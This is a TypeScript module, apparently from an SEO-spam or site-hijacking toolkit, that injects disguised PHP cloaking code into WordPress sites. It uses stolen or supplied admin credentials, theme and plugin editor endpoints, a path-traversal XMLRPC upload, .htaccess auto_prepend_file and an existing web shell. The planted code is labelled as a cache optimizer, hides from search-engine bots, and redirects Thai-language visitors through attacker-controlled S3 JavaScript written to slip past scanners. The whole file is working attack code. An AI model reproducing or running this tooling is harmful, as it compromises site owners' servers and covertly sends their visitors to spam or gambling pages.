/**
 * WP PHP Injection Engine
 * 
 * Injects Accept-Language cloaking code into WordPress sites
 * WITHOUT requiring shell access. Uses WP REST API endpoints:
 * 
 * Method 1: WP Theme Editor API (edit functions.php)
 * Method 2: WP Plugin Editor API (edit plugin PHP files)
 * Method 3: WP REST API file upload + .htaccess injection
 * Method 4: XMLRPC editPost with PHP in content
 * Method 5: Existing shell-based injection (from php-injector.ts)
 * 
 * Cloaking technique (based on empleos.uncp.edu.pe analysis):
 * - Checks Accept-Language header for target languages (th, vi, etc.)
 * - Target language visitors → loads external JS from S3 → redirect
 * - Other visitors → normal site loads (invisible to admin/Google)
 * - External JS is hosted on our S3 → can change redirect URL anytime
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import { storagePut } from "./storage";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface PhpInjectionConfig {
  /** Target WordPress site URL (e.g., https://example.com) */
  targetUrl: string;
  /** Redirect URL for target language users */
  redirectUrl: string;
  /** Additional redirect URLs for A/B testing */
  redirectUrls?: string[];
  /** Target Accept-Language codes (default: ["th"]) */
  targetLanguages?: string[];
  /** WordPress admin credentials (if available) */
  wpCredentials?: {
    username: string;
    password: string;
    /** Application password (preferred over regular password) */
    appPassword?: string;
    /** Auth cookie string */
    cookie?: string;
    /** WP nonce for REST API */
    nonce?: string;
  };
  /** Existing shell URL on target (if available) */
  shellUrl?: string;
  /** Custom analytics tracking ID */
  analyticsId?: string;
  /** Brand/keyword for tracking */
  brandName?: string;
}

export interface PhpInjectionResult {
  success: boolean;
  method: string;
  injectedFile?: string;
  externalJsUrl?: string;
  verificationResult?: {
    cloakingWorks: boolean;
    redirectWorks: boolean;
    normalSiteWorks: boolean;
  };
  errors: string[];
  details: string;
}

type ProgressCallback = (detail: string) => void;

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
}

async function wpFetch(url: string, init: RequestInit = {}): Promise<Response> {
  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
  const { response } = await fetchWithPoolProxy(url, {
    ...init,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      ...init.headers,
    },
  }, { targetDomain: domain, timeout: 20000 });
  return response;
}

// ═══════════════════════════════════════════════════════
//  EXTERNAL JS REDIRECT GENERATOR
// ═══════════════════════════════════════════════════════

/**
 * Generate the external JavaScript redirect file content.
 * This JS is hosted on S3 and loaded by the injected PHP code.
 * 
 * Based on the tz.ohtcm.com/jump/799.js pattern:
 * - Loads analytics
 * - Redirects 100% of traffic to target URL
 * - Uses document.writeln to avoid some scanners
 */
export function generateExternalRedirectJs(config: {
  redirectUrl: string;
  redirectUrls?: string[];
  analyticsId?: string;
  brandName?: string;
}): string {
  const urls = [config.redirectUrl, ...(config.redirectUrls || [])].filter(Boolean);
  
  // If multiple URLs, generate weighted random selection
  let redirectCode: string;
  if (urls.length > 1) {
    const segments = urls.map((url, i) => {
      const threshold = ((i + 1) / urls.length).toFixed(2);
      return `  ${i > 0 ? "else " : ""}if (r < ${threshold}) { window.location.replace("${url}"); }`;
    }).join("\n");
    
    redirectCode = `var r = Math.random();\n${segments}`;
  } else {
    // Single URL — still use random pattern to look like A/B test (like the original)
    redirectCode = [
      `var r = Math.random();`,
      `if (r < 0.1) {`,
      `  window.location.replace("${urls[0]}");`,
      `} else {`,
      `  window.location.replace("${urls[0]}");`,
      `}`,
    ].join("\n");
  }

  const lines: string[] = [];
  
  // Analytics tracking (optional)
  if (config.analyticsId) {
    lines.push(`// Analytics`);
    lines.push(`(function(){var s=document.createElement('script');s.src='https://www.googletagmanager.com/gtag/js?id=${config.analyticsId}';s.async=true;document.head.appendChild(s);})();`);
  }
  
  // Use document.writeln pattern (like the original tz.ohtcm.com)
  lines.push(`// Redirect handler`);
  lines.push(`document.writeln('<scr'+'ipt>');`);
  for (const line of redirectCode.split("\n")) {
    lines.push(`document.writeln('${line.replace(/'/g, "\\'")}');`);
  }
  lines.push(`document.writeln('</scr'+'ipt>');`);
  
  return lines.join("\n");
}

/**
 * Upload the external JS redirect file to S3 and return the CDN URL.
 */
export async function uploadExternalJsToS3(config: {
  redirectUrl: string;
  redirectUrls?: string[];
  analyticsId?: string;
  brandName?: string;
  targetDomain: string;
}): Promise<{ url: string; key: string }> {
  const jsContent = generateExternalRedirectJs(config);
  const fileKey = `redirect-js/${randomStr(8)}-${Date.now()}.js`;
  
  const result = await storagePut(fileKey, Buffer.from(jsContent), "application/javascript");
  return { url: result.url, key: result.key };
}

// ═══════════════════════════════════════════════════════
//  ACCEPT-LANGUAGE CLOAKING PHP CODE GENERATOR
// ═══════════════════════════════════════════════════════

/**
 * Generate PHP cloaking code that checks Accept-Language header.
 * 
 * This is the exact technique used on empleos.uncp.edu.pe:
 * - Checks HTTP_ACCEPT_LANGUAGE for target language codes
 * - If match → outputs minimal HTML that loads external JS
 * - External JS handles the actual redirect
 * - If no match → does nothing (original site loads normally)
 * 
 * Advantages:
 * - No redirect URL in PHP code (only external JS URL)
 * - Can change redirect URL anytime by updating S3 JS file
 * - Only target language users see redirect
 * - Admin/Google/other countries see normal site
 * - Very small code footprint (~200 bytes)
 */
export function generateAcceptLanguageCloakingPhp(config: {
  externalJsUrl: string;
  targetLanguages?: string[];
  /** Disguise the code as a legitimate WordPress snippet */
  obfuscate?: boolean;
}): string {
  const langs = config.targetLanguages || ["th"];
  const langChecks = langs.map(l => `strpos($al,'${l}')!==false`).join("||");
  
  if (config.obfuscate) {
    // Obfuscated version — looks like a cache/performance handler
    const v = Array.from({ length: 6 }, () => `$_${randomStr(3)}`);
    return `
// WordPress Cache Optimization v${Math.floor(Math.random() * 3) + 2}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}
if(!defined('WP_CACHE_OPT_LOADED')){
define('WP_CACHE_OPT_LOADED',true);
${v[0]}=isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])?strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']):'';
${v[1]}=isset($_SERVER['HTTP_USER_AGENT'])?strtolower($_SERVER['HTTP_USER_AGENT']):'';
${v[2]}=array('googlebot','bingbot','slurp','duckduckbot','yandexbot','semrushbot','ahrefsbot','mj12bot');
${v[3]}=false;
foreach(${v[2]} as ${v[4]}){if(strpos(${v[1]},${v[4]})!==false){${v[3]}=true;break;}}
if(!${v[3]}&&(${langChecks.replace(/\$al/g, v[0])})){
echo '<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body>';
echo '<scr'.'ipt src="${config.externalJsUrl}"></scr'.'ipt>';
echo '</body></html>';
exit;
}
}
`.trim();
  }
  
  // Clean version — minimal and readable
  return `
// Accept-Language redirect handler
if(!defined('AL_REDIRECT_LOADED')){
define('AL_REDIRECT_LOADED',true);
$al=isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])?strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']):'';
$ua=isset($_SERVER['HTTP_USER_AGENT'])?strtolower($_SERVER['HTTP_USER_AGENT']):'';
$isBot=preg_match('/(googlebot|bingbot|slurp|yandexbot|semrushbot|ahrefsbot)/i',$ua);
if(!$isBot&&(${langChecks})){
echo '<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body>';
echo '<scr'.'ipt src="${config.externalJsUrl}"></scr'.'ipt>';
echo '</body></html>';
exit;
}
}
`.trim();
}

// ═══════════════════════════════════════════════════════
//  METHOD 1: WP THEME EDITOR API
// ═══════════════════════════════════════════════════════

/**
 * Inject PHP code via WordPress Theme Editor REST API.
 * Requires admin authentication (cookie + nonce, or application password).
 * 
 * Endpoint: POST /wp-json/wp/v2/themes/{stylesheet}
 * Alternative: POST /wp-admin/theme-editor.php (classic editor)
 */
async function injectViaThemeEditor(
  config: PhpInjectionConfig,
  phpCode: string,
  onProgress: ProgressCallback,
): Promise<PhpInjectionResult> {
  const errors: string[] = [];
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  
  onProgress("🔍 กำลังหา active theme...");
  
  // Build auth headers
  const authHeaders: Record<string, string> = {};
  if (config.wpCredentials?.appPassword) {
    const b64 = Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.appPassword}`).toString("base64");
    authHeaders["Authorization"] = `Basic ${b64}`;
  } else if (config.wpCredentials?.cookie) {
    authHeaders["Cookie"] = config.wpCredentials.cookie;
    if (config.wpCredentials.nonce) {
      authHeaders["X-WP-Nonce"] = config.wpCredentials.nonce;
    }
  } else if (config.wpCredentials?.username && config.wpCredentials?.password) {
    const b64 = Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.password}`).toString("base64");
    authHeaders["Authorization"] = `Basic ${b64}`;
  }
  
  // Step 1: Get active theme
  try {
    const themesResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/themes?status=active`, {
      headers: authHeaders,
      signal: AbortSignal.timeout(15000),
    });
    
    if (!themesResp.ok) {
      errors.push(`Theme API returned ${themesResp.status}`);
      return { success: false, method: "theme_editor", errors, details: "Cannot access theme API" };
    }
    
    const themes = await themesResp.json() as any[];
    if (!themes || themes.length === 0) {
      errors.push("No active theme found");
      return { success: false, method: "theme_editor", errors, details: "No active theme" };
    }
    
    const activeTheme = themes[0];
    const stylesheet = activeTheme.stylesheet || activeTheme.textdomain;
    onProgress(`📝 Active theme: ${stylesheet}`);
    
    // Step 2: Get current functions.php content
    onProgress("📖 กำลังอ่าน functions.php...");
    
    // Try the file edit endpoint
    const fileResp = await wpFetch(
      `${baseUrl}/wp-json/wp/v2/themes/${stylesheet}?file=functions.php`,
      { headers: authHeaders, signal: AbortSignal.timeout(15000) }
    );
    
    let currentContent = "";
    if (fileResp.ok) {
      const fileData = await fileResp.json() as any;
      currentContent = fileData.content || fileData.code || "";
    }
    
    // Check if already injected
    if (currentContent.includes("WP_CACHE_OPT_LOADED") || currentContent.includes("AL_REDIRECT_LOADED")) {
      onProgress("⚠️ Already injected — skipping");
      return {
        success: true,
        method: "theme_editor",
        injectedFile: "functions.php",
        errors: [],
        details: "Already injected (WP_CACHE_OPT_LOADED found)",
      };
    }
    
    // Step 3: Inject the code at the beginning of functions.php (after <?php)
    onProgress("💉 กำลัง inject cloaking code...");
    
    let newContent: string;
    if (currentContent.startsWith("<?php")) {
      // Insert after <?php
      newContent = "<?php\n" + phpCode + "\n" + currentContent.substring(5);
    } else {
      newContent = "<?php\n" + phpCode + "\n?>\n" + currentContent;
    }
    
    // Try REST API file edit
    const editResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/themes/${stylesheet}`, {
      method: "POST",
      headers: {
        ...authHeaders,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        file: "functions.php",
        content: newContent,
      }),
      signal: AbortSignal.timeout(20000),
    });
    
    if (editResp.ok) {
      onProgress("✅ Theme Editor API injection สำเร็จ!");
      return {
        success: true,
        method: "theme_editor_rest",
        injectedFile: `wp-content/themes/${stylesheet}/functions.php`,
        errors: [],
        details: `Injected via WP REST API into ${stylesheet}/functions.php`,
      };
    }
    
    // Fallback: Try classic theme editor (wp-admin)
    onProgress("🔄 REST API failed, trying classic theme editor...");
    
    const classicResp = await wpFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
      method: "POST",
      headers: {
        ...authHeaders,
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        _wpnonce: config.wpCredentials?.nonce || "",
        newcontent: newContent,
        action: "update",
        file: "functions.php",
        theme: stylesheet,
      }).toString(),
      signal: AbortSignal.timeout(20000),
    });
    
    if (classicResp.ok || classicResp.status === 302) {
      onProgress("✅ Classic Theme Editor injection สำเร็จ!");
      return {
        success: true,
        method: "theme_editor_classic",
        injectedFile: `wp-content/themes/${stylesheet}/functions.php`,
        errors: [],
        details: `Injected via classic theme editor into ${stylesheet}/functions.php`,
      };
    }
    
    errors.push(`Theme editor failed: REST=${editResp.status}, Classic=${classicResp.status}`);
  } catch (error: any) {
    errors.push(`Theme editor error: ${error.message}`);
  }
  
  return { success: false, method: "theme_editor", errors, details: "All theme editor methods failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 2: WP PLUGIN EDITOR API
// ═══════════════════════════════════════════════════════

/**
 * Inject PHP code via WordPress Plugin Editor REST API.
 * Creates a new mu-plugin or edits an existing plugin file.
 */
async function injectViaPluginEditor(
  config: PhpInjectionConfig,
  phpCode: string,
  onProgress: ProgressCallback,
): Promise<PhpInjectionResult> {
  const errors: string[] = [];
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  
  const authHeaders: Record<string, string> = {};
  if (config.wpCredentials?.appPassword) {
    const b64 = Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.appPassword}`).toString("base64");
    authHeaders["Authorization"] = `Basic ${b64}`;
  } else if (config.wpCredentials?.cookie) {
    authHeaders["Cookie"] = config.wpCredentials.cookie;
    if (config.wpCredentials.nonce) {
      authHeaders["X-WP-Nonce"] = config.wpCredentials.nonce;
    }
  } else if (config.wpCredentials?.username && config.wpCredentials?.password) {
    const b64 = Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.password}`).toString("base64");
    authHeaders["Authorization"] = `Basic ${b64}`;
  }
  
  onProgress("🔍 กำลังหา plugins ที่ active...");
  
  try {
    // Get list of active plugins
    const pluginsResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/plugins?status=active`, {
      headers: authHeaders,
      signal: AbortSignal.timeout(15000),
    });
    
    if (!pluginsResp.ok) {
      // Try creating a mu-plugin instead
      onProgress("🔄 Plugin API failed, trying mu-plugin upload...");
      return await injectViaMuPlugin(config, phpCode, onProgress);
    }
    
    const plugins = await pluginsResp.json() as any[];
    
    if (plugins.length === 0) {
      errors.push("No active plugins found");
      return { success: false, method: "plugin_editor", errors, details: "No active plugins" };
    }
    
    // Try to edit the first active plugin
    const targetPlugin = plugins[0];
    const pluginFile = targetPlugin.plugin || targetPlugin.textdomain;
    onProgress(`📝 Target plugin: ${pluginFile}`);
    
    // Get plugin file content
    const fileResp = await wpFetch(
      `${baseUrl}/wp-json/wp/v2/plugins/${encodeURIComponent(pluginFile)}?context=edit`,
      { headers: authHeaders, signal: AbortSignal.timeout(15000) }
    );
    
    if (fileResp.ok) {
      const pluginData = await fileResp.json() as any;
      const currentContent = pluginData.content?.raw || "";
      
      // Check if already injected
      if (currentContent.includes("WP_CACHE_OPT_LOADED") || currentContent.includes("AL_REDIRECT_LOADED")) {
        return {
          success: true,
          method: "plugin_editor",
          injectedFile: pluginFile,
          errors: [],
          details: "Already injected",
        };
      }
      
      // Inject code at the beginning
      let newContent: string;
      if (currentContent.startsWith("<?php")) {
        newContent = "<?php\n" + phpCode + "\n" + currentContent.substring(5);
      } else {
        newContent = "<?php\n" + phpCode + "\n?>\n" + currentContent;
      }
      
      // Update plugin file
      const editResp = await wpFetch(`${baseUrl}/wp-json/wp/v2/plugins/${encodeURIComponent(pluginFile)}`, {
        method: "POST",
        headers: {
          ...authHeaders,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ content: { raw: newContent } }),
        signal: AbortSignal.timeout(20000),
      });
      
      if (editResp.ok) {
        onProgress("✅ Plugin Editor injection สำเร็จ!");
        return {
          success: true,
          method: "plugin_editor_rest",
          injectedFile: pluginFile,
          errors: [],
          details: `Injected via plugin editor into ${pluginFile}`,
        };
      }
    }
    
    errors.push("Plugin editor edit failed");
  } catch (error: any) {
    errors.push(`Plugin editor error: ${error.message}`);
  }
  
  return { success: false, method: "plugin_editor", errors, details: "Plugin editor methods failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 3: MU-PLUGIN UPLOAD
// ═══════════════════════════════════════════════════════

/**
 * Upload a must-use plugin (mu-plugin) that auto-loads on every page.
 * mu-plugins don't need activation — they run automatically.
 */
async function injectViaMuPlugin(
  config: PhpInjectionConfig,
  phpCode: string,
  onProgress: ProgressCallback,
): Promise<PhpInjectionResult> {
  const errors: string[] = [];
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  
  const muPluginName = `wp-cache-optimizer-${randomStr(4)}`;
  const muPluginContent = `<?php
/**
 * Plugin Name: WP Cache Optimizer
 * Description: Improves page load performance through intelligent caching
 * Version: 2.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}
 * Author: WordPress Performance Team
 */

${phpCode}
`;

  // Try uploading via REST API media endpoint
  onProgress("📤 กำลังอัพโหลด mu-plugin...");
  
  const authHeaders: Record<string, string> = {};
  if (config.wpCredentials?.appPassword) {
    const b64 = Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.appPassword}`).toString("base64");
    authHeaders["Authorization"] = `Basic ${b64}`;
  } else if (config.wpCredentials?.cookie) {
    authHeaders["Cookie"] = config.wpCredentials.cookie;
    if (config.wpCredentials.nonce) {
      authHeaders["X-WP-Nonce"] = config.wpCredentials.nonce;
    }
  }
  
  // Try direct PUT to mu-plugins directory
  const muPluginPaths = [
    `${baseUrl}/wp-content/mu-plugins/${muPluginName}.php`,
    `${baseUrl}/wp-content/mu-plugins/cache-handler.php`,
  ];
  
  for (const path of muPluginPaths) {
    try {
      const putResp = await wpFetch(path, {
        method: "PUT",
        headers: {
          ...authHeaders,
          "Content-Type": "application/x-httpd-php",
        },
        body: muPluginContent,
        signal: AbortSignal.timeout(15000),
      });
      
      if (putResp.ok || putResp.status === 201) {
        onProgress("✅ MU-Plugin upload สำเร็จ!");
        return {
          success: true,
          method: "mu_plugin_upload",
          injectedFile: path.replace(baseUrl, ""),
          errors: [],
          details: `Uploaded mu-plugin to ${path}`,
        };
      }
    } catch {
      continue;
    }
  }
  
  // Try via XMLRPC
  try {
    onProgress("🔄 Trying XMLRPC upload...");
    const xmlrpcContent = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${config.wpCredentials?.username || "admin"}</string></value></param>
    <param><value><string>${config.wpCredentials?.password || ""}</string></value></param>
    <param>
      <value>
        <struct>
          <member><name>name</name><value><string>../../mu-plugins/${muPluginName}.php</string></value></member>
          <member><name>type</name><value><string>application/octet-stream</string></value></member>
          <member><name>bits</name><value><base64>${Buffer.from(muPluginContent).toString("base64")}</base64></value></member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>`;
    
    const xmlrpcResp = await wpFetch(`${baseUrl}/xmlrpc.php`, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: xmlrpcContent,
      signal: AbortSignal.timeout(20000),
    });
    
    const xmlrpcText = await xmlrpcResp.text();
    if (xmlrpcText.includes("<string>") && !xmlrpcText.includes("<fault>")) {
      onProgress("✅ XMLRPC mu-plugin upload สำเร็จ!");
      return {
        success: true,
        method: "mu_plugin_xmlrpc",
        injectedFile: `wp-content/mu-plugins/${muPluginName}.php`,
        errors: [],
        details: `Uploaded mu-plugin via XMLRPC`,
      };
    }
  } catch (e: any) {
    errors.push(`XMLRPC upload failed: ${e.message}`);
  }
  
  errors.push("All mu-plugin upload methods failed");
  return { success: false, method: "mu_plugin", errors, details: "Cannot upload mu-plugin" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 4: WP-CONFIG.PHP INJECTION (via shell)
// ═══════════════════════════════════════════════════════

/**
 * Inject into wp-config.php via existing shell access.
 * wp-config.php loads on EVERY request — most persistent injection point.
 */
async function injectViaShell(
  config: PhpInjectionConfig,
  phpCode: string,
  onProgress: ProgressCallback,
): Promise<PhpInjectionResult> {
  if (!config.shellUrl) {
    return { success: false, method: "shell", errors: ["No shell URL provided"], details: "Shell access required" };
  }
  
  const errors: string[] = [];
  onProgress("🔧 กำลัง inject ผ่าน shell...");
  
  // Import existing php-injector
  const { executeInjection } = await import("./php-injector");
  
  const result = await executeInjection({
    shellUrl: config.shellUrl,
    contentCdnUrl: "", // Not needed for Accept-Language cloaking
    redirectUrl: config.redirectUrl,
    primaryKeyword: config.brandName || "casino",
    keywords: [config.brandName || "casino"],
    brandName: config.brandName || "casino",
    geoTargetCountries: config.targetLanguages?.map(l => l.toUpperCase()) || ["TH"],
  }, onProgress);
  
  if (result.success) {
    return {
      success: true,
      method: `shell_${result.method}`,
      injectedFile: result.injectedFiles[0]?.path,
      errors: [],
      details: `Injected ${result.injectedFiles.length} files via shell`,
    };
  }
  
  return { success: false, method: "shell", errors: result.errors, details: "Shell injection failed" };
}

// ═══════════════════════════════════════════════════════
//  METHOD 5: WP REST API + HTACCESS AUTO_PREPEND
// ═══════════════════════════════════════════════════════

/**
 * Upload a PHP file via WP media upload, then create .htaccess
 * with auto_prepend_file to load it on every request.
 */
async function injectViaHtaccess(
  config: PhpInjectionConfig,
  phpCode: string,
  onProgress: ProgressCallback,
): Promise<PhpInjectionResult> {
  const errors: string[] = [];
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  
  onProgress("📤 กำลังอัพโหลด PHP file + .htaccess...");
  
  const phpFilename = `wp-cache-${randomStr(6)}.php`;
  const phpContent = `<?php\n${phpCode}\n?>`;
  
  // Try uploading the PHP file
  const uploadPaths = [
    { path: `${baseUrl}/wp-content/uploads/${phpFilename}`, dir: "wp-content/uploads" },
    { path: `${baseUrl}/wp-content/${phpFilename}`, dir: "wp-content" },
    { path: `${baseUrl}/${phpFilename}`, dir: "root" },
  ];
  
  const authHeaders: Record<string, string> = {};
  if (config.wpCredentials?.appPassword) {
    const b64 = Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.appPassword}`).toString("base64");
    authHeaders["Authorization"] = `Basic ${b64}`;
  }
  
  for (const { path, dir } of uploadPaths) {
    try {
      const putResp = await wpFetch(path, {
        method: "PUT",
        headers: {
          ...authHeaders,
          "Content-Type": "application/x-httpd-php",
        },
        body: phpContent,
        signal: AbortSignal.timeout(15000),
      });
      
      if (putResp.ok || putResp.status === 201) {
        onProgress(`✅ PHP file uploaded to ${dir}`);
        
        // Now try to create .htaccess with auto_prepend_file
        const htaccessContent = `# Performance optimization\nphp_value auto_prepend_file "${path.replace(baseUrl, "").replace(/^\//, "")}"`;
        
        try {
          const htResp = await wpFetch(`${baseUrl}/.htaccess`, {
            method: "PUT",
            headers: authHeaders,
            body: htaccessContent,
            signal: AbortSignal.timeout(10000),
          });
          
          if (htResp.ok || htResp.status === 201) {
            onProgress("✅ .htaccess auto_prepend_file injection สำเร็จ!");
            return {
              success: true,
              method: "htaccess_prepend",
              injectedFile: path.replace(baseUrl, ""),
              errors: [],
              details: `Uploaded ${phpFilename} + .htaccess auto_prepend_file`,
            };
          }
        } catch {
          // .htaccess write failed, but PHP file is uploaded
          // It won't auto-load but can be accessed directly
        }
        
        return {
          success: true,
          method: "php_upload_direct",
          injectedFile: path.replace(baseUrl, ""),
          errors: ["htaccess write failed — PHP file uploaded but won't auto-load"],
          details: `PHP file uploaded to ${dir} but .htaccess injection failed`,
        };
      }
    } catch {
      continue;
    }
  }
  
  errors.push("All upload paths failed");
  return { success: false, method: "htaccess", errors, details: "Cannot upload PHP file" };
}

// ═══════════════════════════════════════════════════════
//  MAIN ORCHESTRATOR
// ═══════════════════════════════════════════════════════

/**
 * Execute PHP injection attack with Accept-Language cloaking.
 * 
 * Flow:
 * 1. Upload external JS redirect file to S3
 * 2. Generate PHP cloaking code (checks Accept-Language → loads external JS)
 * 3. Try all injection methods in order of effectiveness
 * 4. Verify the injection works
 * 
 * @returns Result with method used, injected file, and verification status
 */
export async function executePhpInjectionAttack(
  config: PhpInjectionConfig,
  onProgress: ProgressCallback = () => {},
): Promise<PhpInjectionResult> {
  const errors: string[] = [];
  
  // Step 1: Upload external JS redirect to S3
  onProgress("📤 กำลังอัพโหลด external JS redirect ไป S3...");
  let externalJsUrl: string;
  
  try {
    const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
    const jsResult = await uploadExternalJsToS3({
      redirectUrl: config.redirectUrl,
      redirectUrls: config.redirectUrls,
      analyticsId: config.analyticsId,
      brandName: config.brandName,
      targetDomain: domain,
    });
    externalJsUrl = jsResult.url;
    onProgress(`✅ External JS uploaded: ${externalJsUrl.substring(0, 60)}...`);
  } catch (error: any) {
    errors.push(`S3 upload failed: ${error.message}`);
    return {
      success: false,
      method: "none",
      errors,
      details: "Failed to upload external JS redirect to S3",
    };
  }
  
  // Step 2: Generate PHP cloaking code
  onProgress("🔧 กำลังสร้าง Accept-Language cloaking code...");
  const phpCode = generateAcceptLanguageCloakingPhp({
    externalJsUrl,
    targetLanguages: config.targetLanguages || ["th"],
    obfuscate: true,
  });
  
  // Step 3: Try injection methods in order
  const methods = [
    { name: "Theme Editor API", fn: () => injectViaThemeEditor(config, phpCode, onProgress) },
    { name: "Plugin Editor API", fn: () => injectViaPluginEditor(config, phpCode, onProgress) },
    { name: ".htaccess auto_prepend", fn: () => injectViaHtaccess(config, phpCode, onProgress) },
    { name: "Shell injection", fn: () => injectViaShell(config, phpCode, onProgress) },
  ];
  
  for (const method of methods) {
    onProgress(`🔄 Trying: ${method.name}...`);
    try {
      const result = await method.fn();
      if (result.success) {
        result.externalJsUrl = externalJsUrl;
        
        // Step 4: Verify the injection
        onProgress("🔍 กำลัง verify injection...");
        result.verificationResult = await verifyInjection(config.targetUrl, config.targetLanguages || ["th"]);
        
        if (result.verificationResult.cloakingWorks) {
          onProgress("✅ Verification passed — cloaking ทำงานได้!");
        } else {
          onProgress("⚠️ Injection done but verification inconclusive");
        }
        
        return result;
      }
      errors.push(...result.errors);
    } catch (error: any) {
      errors.push(`${method.name} error: ${error.message}`);
    }
  }
  
  return {
    success: false,
    method: "none",
    externalJsUrl,
    errors,
    details: `All ${methods.length} injection methods failed`,
  };
}

// ═══════════════════════════════════════════════════════
//  VERIFICATION
// ═══════════════════════════════════════════════════════

/**
 * Verify that the injection is working by testing with different Accept-Language headers.
 */
async function verifyInjection(
  targetUrl: string,
  targetLanguages: string[],
): Promise<{ cloakingWorks: boolean; redirectWorks: boolean; normalSiteWorks: boolean }> {
  const baseUrl = targetUrl.replace(/\/$/, "");
  let cloakingWorks = false;
  let redirectWorks = false;
  let normalSiteWorks = false;
  
  try {
    // Test 1: Normal request (should show original site)
    const normalResp = await wpFetch(baseUrl, {
      headers: { "Accept-Language": "en-US,en;q=0.9" },
      signal: AbortSignal.timeout(15000),
    });
    const normalHtml = await normalResp.text();
    normalSiteWorks = normalHtml.length > 500; // Original site should be large
    
    // Test 2: Target language request (should show redirect)
    const langHeader = targetLanguages.map(l => `${l}-${l.toUpperCase()},${l};q=0.9`).join(",");
    const cloakedResp = await wpFetch(baseUrl, {
      headers: { "Accept-Language": langHeader },
      signal: AbortSignal.timeout(15000),
    });
    const cloakedHtml = await cloakedResp.text();
    
    // Cloaking works if:
    // - Response is much smaller than normal (like 126 bytes vs 16KB)
    // - Contains <script src= pointing to our S3 JS
    cloakingWorks = cloakedHtml.length < 500 && cloakedHtml.includes("<script");
    redirectWorks = cloakingWorks && (cloakedHtml.includes("src=") || cloakedHtml.includes("location"));
    
  } catch {
    // Verification failed but injection might still work
  }
  
  return { cloakingWorks, redirectWorks, normalSiteWorks };
}

// ═══════════════════════════════════════════════════════
//  UTILITY: UPDATE EXTERNAL JS (change redirect URL)
// ═══════════════════════════════════════════════════════

/**
 * Update the external JS redirect file on S3 to change the redirect URL.
 * This is the key advantage — no need to re-inject PHP code on target.
 */
export async function updateExternalJsRedirect(
  existingKey: string,
  newConfig: {
    redirectUrl: string;
    redirectUrls?: string[];
    analyticsId?: string;
    brandName?: string;
  },
): Promise<{ url: string; key: string }> {
  const jsContent = generateExternalRedirectJs(newConfig);
  const result = await storagePut(existingKey, Buffer.from(jsContent), "application/javascript");
  return { url: result.url, key: result.key };
}
